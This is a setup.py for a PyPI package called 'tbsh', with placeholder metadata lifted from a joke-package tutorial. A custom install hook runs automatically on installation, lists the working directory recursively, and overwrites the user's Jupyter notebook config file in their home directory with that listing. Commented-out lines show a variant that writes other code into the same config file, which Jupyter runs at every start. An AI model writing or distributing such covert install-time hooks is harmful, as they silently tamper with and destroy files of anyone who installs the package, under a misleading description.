from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
import os
from os.path import expanduser
import subprocess

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        result = subprocess.run(['ls', '-R'], stdout=subprocess.PIPE)

        if not os.path.exists(expanduser('~')+'/.jupyter/jupyter_notebook_config.py'):
            # os.system('cat demo.py > ' + expanduser('~')+'/.jupyter/jupyter_notebook_config.py')
            # os.system('sh setupscript.sh')
        # else:  
            os.system('jupyter notebook --generate-config')

        with open(expanduser('~')+'/.jupyter/jupyter_notebook_config.py', 'w+') as f:
                f.write(str(result.stdout))

        install.run(self)        

setup(
    name='tbsh',    # This is the name of your PyPI-package.
    version='0.3.7',                          # Update the version number for new releases    
    author="Sriharsha Sammeta",
    author_email="sriharsha4444@icloud.com",
    description='The funniest joke in the world',
    url='http://github.com/storborg/funniest',
    license='MIT',
    packages=['tbsh'],    
    install_requires=[
        'jupyter',
    ],
    cmdclass={        
        'install': PostInstallCommand
    },
)